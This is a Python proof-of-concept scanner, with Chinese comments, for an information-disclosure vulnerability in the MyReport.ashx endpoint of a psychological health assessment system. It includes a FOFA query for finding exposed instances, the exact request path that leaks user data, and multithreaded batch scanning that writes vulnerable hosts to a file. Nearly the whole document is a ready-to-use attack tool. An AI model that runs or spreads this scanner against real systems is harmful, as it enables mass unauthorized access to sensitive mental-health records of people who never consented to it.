#京师心智心理健康测评系统 MyReport.ashx 信息泄露漏洞

#fofa语法：body="JS/ligerComboBox/ligerTree.js"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

  __  __       _____                       _              _          
 |  \/  |     |  __ \                     | |            | |         
 | \  / |_   _| |__) |___ _ __   ___  _ __| |_   __ _ ___| |__ __  __
 | |\/| | | | |  _  // _ \ '_ \ / _ \| '__| __| / _` / __| '_ \\ \/ /
 | |  | | |_| | | \ \  __/ |_) | (_) | |  | |_ | (_| \__ \ | | |>  < 
 |_|  |_|\__, |_|  \_\___| .__/ \___/|_|   \__(_)__,_|___/_| |_/_/\_\
          __/ |          | |                                         
         |___/           |_|                                         
                                                                                         
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="京师心智心理健康测评系统")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200 and "loginname" in res.text:
            print(f"f[+]该url存在信息泄露漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在信息泄露漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()